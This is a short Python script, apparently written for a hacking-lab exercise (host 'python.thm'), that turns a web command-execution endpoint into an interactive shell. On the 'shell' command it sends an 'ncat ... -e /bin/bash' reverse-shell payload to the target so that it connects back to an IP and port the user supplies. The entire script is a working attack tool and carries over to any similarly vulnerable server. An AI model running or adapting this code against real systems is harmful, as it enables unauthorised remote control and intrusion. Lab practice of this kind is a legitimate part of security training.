import requests


def exploit():
    while True:
        command = input("Shell#> ")
        url = f"http://python.thm/labs/lab3/execute.php?cmd={command}"
        r = requests.post(url=url)
        print("\n",r.text)
        if command == "quit" or command == "exit":
            print("Good bye")
            break
        elif command == "shell":
            ip = input("RevShell IP: ")
            port = input("RevShell port: ")
            payload1 = f"ncat {ip} {port} -e /bin/bash"
            print(" set up your listener")
            check = input("\n listener set? (y/n) ")
            if check == "y":
                r = requests.post(url=f"http://python.thm/labs/lab3/execute.php?cmd={payload1}")
                print(r.text)
            else:
                print("DO IT")

exploit()
